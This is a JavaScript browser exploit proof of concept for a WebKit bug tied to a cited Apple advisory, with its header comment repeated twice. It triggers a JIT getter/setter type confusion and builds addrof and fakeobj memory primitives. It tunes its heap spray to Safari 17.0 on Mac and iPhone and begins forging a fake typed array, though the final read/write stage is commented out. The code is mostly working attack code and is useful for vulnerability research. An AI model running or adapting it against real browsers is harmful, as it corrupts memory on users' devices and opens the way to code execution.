/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
var referenceFloat64Array = new Float64Array(0x1000);

let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}


(function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;
    let unknown_device = false;

    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }

    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        // return unboxed_arr[0];
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        // unboxed_arr[0] = addr;
        return boxed_arr[8];
    }
    
    function lol() {
        log("stage 2");
        // spray to increase finding structure id
        var structs = [];
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            a['prop' + i] = 1337;
            structs.push(a);
        }

        var jsCellHeader = new Int64([
            00, 0x10, 00, 00,     // m_structureID
            0x0,                  // m_indexingType
            0x2b,                 // m_type
            0x08,                 // m_flags
            0x1                   // m_cellState
        ]);

        var float64MemView = new Float64Array(0x200);
        var uint8MemView = new Uint8Array(0x1000);

        let container = {
            jsCellHeader: jsCellHeader.asJSValue(),
            butterfly: null,
            vector: float64MemView,
            length: (new Int64('0x0001000000001337')).asJSValue(),
            mode: {},       // an empty object, we'll need that later
        };
        
        let container_addr = addrof(container);
        log(container_addr.toString());
        // add offset from container object to its inline properties
        let fake_array_addr = Add(container_addr, 16);

        log("Fake float64array @ " + fake_array_addr);
        log("jsCellHeader: "+ jsCellHeader);
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        log("jsCellHeader: "+ jsCellHeader);
        container.jsCellHeader = jsCellHeader;
        log("container.jscellheader: " + container.jsCellHeader.toString());

        // hard part
        let driver = fakeobj(fake_array_addr);

        // // Find the correct structure ID. https://web.archive.org/web/20210115003003/http://www.phrack.org:80/papers/attacking_javascript_engines.html
        // while (!(driver instanceof Float64Array)) {
        //     jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        //     container.jsCellHeader = jsCellHeader.asJSValue();
        // }
        // // All done, fakearray now points onto the hax array

        // // Get some addresses that we'll need to repair our objects. We'll abuse the .mode
        // // property of the container to leak addresses.
        // driver[2] = container_addr;
        // var emptyObjectRawAddr = float64MemView[6];
        // container.mode = referenceFloat64Array;
        // var referenceFloat64ArrayRawAddr = float64MemView[6];

        // // Fixup the JSCell header of the container to make it look like an empty object.
        // // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
        // driver[2] = emptyObjectRawAddr;
        // var header = float64MemView[0];
        // driver[2] = container_addr;
        // float64MemView[0] = header;

        // // Copy the JSCell header from an existing Float64Array and set the butterfly to zero.
        // // Also set the mode: make it look like an OversizeTypedArray for easy GC survival
        // // (see JSGenericTypedArrayView<Adaptor>::visitChildren).
        // driver[2] = referenceFloat64ArrayRawAddr;
        // var header = float64MemView[0];
        // var length = float64MemView[3];
        // var mode = float64MemView[4];
        // driver[2] = containerRawAddr;
        // float64MemView[2] = header;
        // float64MemView[3] = 0;
        // float64MemView[5] = length;
        // float64MemView[6] = mode;

        // // Root the container object so it isn't garbage collected.
        // // This will allocate a butterfly for the fake object and store a reference to the container there.
        // // The fake array itself is rooted by the memory object (closures).
        // driver.container = container;

        log("All done.")
    }

    let sample = BigInt(addrof({}).toString());
    if (sample >= 0x200000000 || sample < 0x100000000) {
        log('failed');
        // location.reload();
        return;
    } else {
        log(`success!!!`);
        testobject = {};
        testobject.a = 1;
        testobject.b = 2;
        testobject.c = 3;
        log("testobject addr: " + addrof(testobject).toString() + "<br>testobject properties: ");
        Object.values(testobject).forEach((prop)=> log(prop));
        testobjectfake = fakeobj(addrof(testobject));
        testobjectfake.b = "we out here";
        testobjectfake.c = 1337;
        log("<br>fake object addr: " + addrof(testobjectfake).toString() + "<br>fakeobject edited testobject properties:");
        Object.values(testobject).forEach((prop)=> log(prop));
        lol();
        if (unknown_device) {
            log(`you seems to have found valid factor for an untested device!\nif you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isIphone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
        }
    }
})();